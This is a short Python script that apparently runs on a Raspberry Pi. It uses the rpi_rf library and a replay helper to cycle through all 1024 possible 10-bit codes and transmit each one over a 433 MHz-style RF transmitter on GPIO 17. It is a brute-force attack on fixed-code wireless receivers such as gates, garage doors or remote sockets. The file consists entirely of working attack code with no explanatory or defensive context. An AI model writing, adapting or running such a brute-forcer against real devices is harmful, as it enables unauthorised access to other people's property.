import os
import sys
from rpi_rf import *
from replay_signal import *

def brute_force(range_value):
	t = 0
	gpio = 17
	o = RFDevice(gpio)
	o.enable_tx()
	for i in range(range_value):
		i = bin(i)[2:]
		if len(str(i)) < 10:
			i = '0'+str((10-len(str(i)))*'0')+str(i)+'10'
			send_10(i)
			o._sleep(t)
		else:
			i = '0'+str(i)+'10'
#			print(i)
			send_10(str(i))
			o._sleep(t)

if __name__ == '__main__':
	brute_force(1024)